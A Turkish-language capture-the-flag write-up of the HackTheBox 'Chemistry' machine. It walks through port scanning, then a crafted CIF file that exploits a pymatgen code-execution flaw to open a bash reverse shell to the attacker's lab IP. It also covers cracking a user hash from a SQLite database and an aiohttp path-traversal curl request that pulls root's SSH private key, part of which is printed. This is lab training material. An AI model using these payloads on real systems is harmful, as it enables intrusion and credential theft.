---
title: 'HackTheBox | Chemistry WriteUp'
author: appdone
categories: [HackTheBox Machines]
tags: [command injection, lfi, directory traversal]
render_with_liquid: false
media_subpath: /images/hackthebox_chemistry/
image:
  path: logo.webp
---

## Özet

Web uygulamasında bir dosyanın analiz edildiği sırada oluşan bir zafiyet olduğunu öğrenecek ve dosya içeriğini değiştirerek zafiyeti istismar edeceğiz. Daha sonra web uygulamasında kullanılan `sqlite` dosyasının içerisinden sistem kullanıcısının bilgilerini çıkaracağız. Yetki yükseltebilmek için sistemde dolaştığımız sırada yerel ağda bir web uygulamasının çalıştığını tespit edecek ve bu web uygulamasında kullanılan bir modülün üzerinde `Local File Inclusion` zafiyetinin olduğunu keşfedeceğiz. Sonrada bu zafiyetten faydalanarak `root` kullanıcısının `id_rsa` dosyasını çekecek ve bu dosyayı kullanarak `root` kullanıcısına geçiş yapacağız.

## Keşif aşaması

### Nmap taraması

```console
$ nmap -sV -sC -T4 10.10.11.38
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-22 07:44 EDT
Nmap scan report for 10.10.11.38
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
...
```

Tarama sonucunda 22 (SSH) ve 5000 (HTTP) numaralı portların açık olduğunu ve web uygulamasının `python flask` ile yapıldığını öğreniyoruz.

### 80 numaralı port'un incelenmesi

![](1.webp){: width="900" height="500" }

HTTP servisi üzerinde `flask` ile yapılmış `CIF` dosyalarını analiz eden bir uygulama barınıyor. Bir kullanıcı oluşturalım daha sonra ise siteye giriş yapalım.

![](2.webp){: width="900" height="500" }

Örnek bir `CIF` dosyası verilmiş. Bu dosyayı indirdikten sonra tekrar yüklüyor ve sonuçları görüntülüyoruz.

![](3.webp){: width="900" height="600" }

Bazı yazıları doğrudan ekrana yazdırdığını düşünerek dosyayı düzenlemeye çalıştım ama hiçbir şekilde kod çalıştıramadım. Uzantısını google da arattığımızda ise [bu](https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/) sayfa ile karşılaşıyoruz.

## Sömürü aşaması

Sayfa içerisinde gördüğümüz `CIF` dosyasının komut çalıştırdığı alanına reverse shell komutumuzu ekleyelim.

```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.117/4444 0>&1'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Bu içeriği `.cif` uzantılı olacak şekilde bir dosyaya kayıt ettikten sonra dinlemeye aldığımız port üzerinden bir shell elde ediyoruz.

![](4.webp){: width="1200" height="600" }

## Yetki yükseltme

### rosa

Web uygulamasında kullanıcı girişi olduğunu hatırlıyorsunuzdur, bu kullanıcı bilgilerinin bulunduğu dosyanın içerisinde sistem kullanıcılarından biri olan rosa'nın bilgileride bulunuyor.

```console
app@chemistry:~/instance$ strings database.db | grep "rosa"
Mrosa63ed86ee9f624c7b14f1d4f43dc251a5'
```

Hash'i [hashes.com](https://hashes.com/) sitesinin yardımıyla kırdıktan sonra rosa kullanıcısına geçiş yapıyor ve ilk bayrağı kendi dizininden alıyoruz.

### root

8080 numaralı yerel port üzerinde bir web uygulaması çalışıyor.

```console
rosa@chemistry:~$ netstat -tupln
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      34896/bash          
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
rosa@chemistry:~$
```

Bu web uygulaması ile ilgilenebilmemiz için SSH tünellemesi vasıtasıyla kendi ağımızdan geçireceğiz.

```console
$ ssh rosa@10.10.11.38 -L 8080:127.0.0.1:8080
```

![](5.webp){: width="1200" height="600" }

Web uygulaması sistemdeki servislerin kontrolünü sağlayan bir uygulamaya benziyor. Tüm özellikleri de kapalı durumda, site üzerinde hiçbir işlem yapamıyoruz.

![](6.webp){: width="1200" height="600" }

Bulunduğu `/opt/monitoring_site` dizininede giriş iznimiz yok. Geliştirici araçlarının yardımıyla web uygulamasının header bilgilerini görüntülediğimizde python da bulunan `aiohttp` modülünün `3.9.1` sürümünü kullandığını görüyoruz.

![](7.webp){: width="1200" height="600" }

Modülü sürümüyle beraber internette arattığımızda [Local File Inclusion](https://github.com/wizarddos/CVE-2024-23334/blob/master/exploit.py) zafiyetinin varlığından haberdar oluyoruz. Bu zafiyetten yararlanarak `root` kullanıcısının dizininde bulunan `id_rsa` dosyasını çekiyoruz.

```console
rosa@chemistry:~$ curl --path-as-is http://localhost:8080/assets/../../../../../../root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsFbYzGxskgZ6YM1LOUJsjU66WHi8Y2ZFQcM3G8VjO+NHKK8P0hIU
UbnmTGaPeW4evLeehnYFQleaC9u//vciBLNOWGqeg6Kjsq2lVRkAvwK2suJSTtVZ8qGi1v
j0wO69QoWrHERaRqmTzranVyYAdTmiXlGqUyiy0I7GVYqhv/QC7jt6For4PMAjcT0ED3Gk
HVJONbz2eav5aFJcOvsCG1aC93Le5R43Wgwo7kHPlfM5DjSDRqmBxZpaLpWK3HwCKYITbo
DfYsOMY0zyI0k5yLl1s685qJIYJHmin9HZBmDIwS7e2riTHhNbt2naHxd0WkJ8PUTgXuV2
...
```

Daha sonra kendisini kullanarak sisteme giriş yapıyor ve bayrağı `/root` dizininden alıyoruz.

```console
$ chmod 600 id_rsa
$ ssh root@10.10.11.38 -i id_rsa
...
root@chemistry:~# ls
root.txt
root@chemistry:~# cat root.txt 
33a1...8a9a
```
